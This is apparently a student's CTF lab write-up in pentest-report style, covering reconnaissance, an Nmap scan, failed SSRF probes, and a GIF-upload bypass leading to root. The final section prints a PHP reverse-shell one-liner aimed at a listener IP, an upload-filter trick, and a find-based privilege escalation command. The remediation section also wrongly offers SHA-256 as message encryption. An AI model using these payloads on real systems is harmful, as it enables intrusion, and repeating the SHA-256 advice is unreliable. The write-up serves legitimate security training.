OSINT
Technical Findings
Description:
The first task of the CTF challenge with emphasis on recoinnassance of the
target. Flag was hidden inside the style.css stylesheet
Risk:
Likelihood: Medium – Sometimes developers may leave editing / to-do marks in
the html, css or other publicly accessible files or directories which may contain
sensitive information. When information is gathered in extent, the likeliness of
connections and valuable information appearing increases.
Impact: Medium – Depending on the content, the leaked information may
contain credentials or can be utilized to understand the network topology or
structure of the service for further exploitation
System:
Linux Parrot OS
Tools Used:
Mozilla Firefox
Evidence
Figure 1: Inspect tab of http://192.168.1.194:9999
Figure 2: style.css contents (the flag)
Remediation
In order to mitigate risks, the principle of no-trust must be asserted when implementing features to, for
example, web pages. Comments and publicly accessible resources must not contain sensitive information.
Authentication, access control and secure and updated practices must be in place to mitigate the sensitive
information which can be gathered from the service.
Nmap
Technical Findings
Description:
The next task was to gather information about the IP-address 192.168.1.195.
Nmap TCP port scan on every port revealed an open http service at port 10111.
The service parameter displayed more information about the service and due to
it being a http service, a http request could be performed with wget. With the
extracted information, a decodable message was presented, which could be
decoded with base64 UTF-8 decoder
Risk:
Likelihood: High – nmap is a powerful tool in recoinnassance and can be utilized
to detect open ports, service type and even bypass security features, e.g.
firewalls with the correct requests. Encoded information can also be directly
detected and encoded in the right environments and password lists can also be
utilized
Impact: High – Active recoinnassance is hard to avoid and based on the revealed
information, it can be further exploited if vulnerabilities are found.
System:
Linux Parrot OS
Tools Used:
Nmap, wget, Mozilla Firefox, www.base64decode.org
Evidence
Figure 3: nmap scan
Figure 4: wget index.html download
Figure 5: index.html contents and hidden message in the html title
Figure 6: Message decoding [1]
Remediation
For port scanning, stateful firewalls can be utilized to track established connections and efficient IDPS
systems can be utilized to further detect and block unauthorized scans. Network segmentation also
provides security, as the resources exposure is limited. When encoding information, it is important to use
strong cryptographic functions to properly obfuscate the message, such as SHA-256.
SSRF
Technical Findings
Description:
The third challenge included the utilization of the Server-Side Request Forgery
vulnerability. Inspection of the html element revealed that there is a flag.txt file
at the root directory, but during the challenge, there was difficulties to craft the
right payload to get the file.
Risk:
Likelihood: Medium – SSRF exploits the server to perform requests, so the
threat may not be recognized as it appears to be originating internally.
Impact: Very High – SSRF can be utilized to scan networks, read files and even
access internal API’s and services
System:
Linux Parrot OS
Tools Used:
Mozilla Firefox
Evidence
While the queries couldn’t be successfully crafted to display the flag.txt file, the server version could be
exposed and the port number. Writing localhost to the input box, revealed another input box next to the
first one. The following queries were tried but were unsuccessful.
- localhost/file:///flag.txt
- localhost/file://root/flag.txt
- file://root/flag.txt
- 127.0.0.1/flag.txt
Remediation
The service can be modified to only allow external requests in order to mitigate risks of abuse. With a list of
denied and permitted commands and sites, the allowed requests can also be controlled. Path obscuration
can also be used to mitigate the risk of directory iteration
File upload and priviledge escalation
Technical Findings
Description:
The last part of the CTF. A file upload service only allowing GIF-image uploads
was utilized to execute a reverse shell to the target system and with the reverse
shell, privileges could be utilized with a well crafted find-command
Risk:
Likelihood: Medium – Depending on the proper validation, sanitaziation and
verification of the uploads, the likeliness of script execution varies.
Impact: Very High – With remote access and privilege escalation, full access to
the system could be achieved
System:
Linux Parrot OS
Tools Used:
Mozilla Firefox, Pluma, nc, find, revshells.com
Evidence
Figure 7: With a resend of the POST request, the Content-Type could be changed to image/gif and a header for the gif image could
be added (GIF89a;)
After the upload exploit was discovered, a different php file was uploaded with a reverse shell generator
that directly connects to the listener at the machine IP 192.168.1.8, port 4444 (<?php exec("/bin/bash -c
'bash -i >& /dev/tcp/192.168.1.8/4444 0>&1'");). [2]
Figure 8: Reverse shell and privilege escalation
As sudo, nano and less commands couldn’t be utilized, a previously used find command could be used for
privilege escalation [3] (find . -exec /bin/sh \; -quit)
Figure 9: First flag was found in var/www/html
Figure 10: last flag in root directory
Remediation
While the content type could be recognized, the php script could still be executed, even as the content-
type was modified to image/gif. Proper validation and by only allowing the chosen file type to be executed
should reduce risks of misuse. Also, isolation the file upload are reduces risks and mitigates the attack
vector. Privilege escalation can be mitigated with proper limitations on non-root operations and strong
access control mechanisms such as multi-factor authentication for user changes.
